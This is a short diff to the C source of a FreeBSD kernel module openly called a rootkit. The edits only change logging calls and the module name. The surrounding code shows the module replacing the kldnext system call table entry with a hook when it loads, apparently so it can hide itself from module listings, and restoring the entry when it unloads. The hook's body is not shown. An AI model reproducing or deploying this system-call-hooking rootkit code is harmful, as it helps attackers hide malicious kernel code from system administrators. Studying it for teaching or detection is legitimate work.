@@ -47,12 +47,12 @@ static int load(struct module *module, int cmd, void *arg) {
 
 	switch (cmd) {
 	case MOD_LOAD:
-		// uprintf("System call loaded at offset %d.\n", offset);
+		printf("system call loaded at offset %d.\n", offset);
 		sysent[SYS_kldnext].sy_call = (sy_call_t *)sys_kldnext_hook;
 		break;
 
 	case MOD_UNLOAD:
-		// uprintf("System call unloaded from offset %d.\n", offset);
+		printf("system call unloaded from offset %d.\n", offset);
 		sysent[SYS_kldnext].sy_call = (sy_call_t *)sys_kldnext;
 		break;
 
@@ -69,7 +69,7 @@ static struct syscall_module_data rootkit_func_mod = {
 };
 
 static moduledata_t rootkit_mod = {
-	"rootkit",
+	MODULE_NAME,
 	syscall_module_handler,
 	&rootkit_func_mod
 };
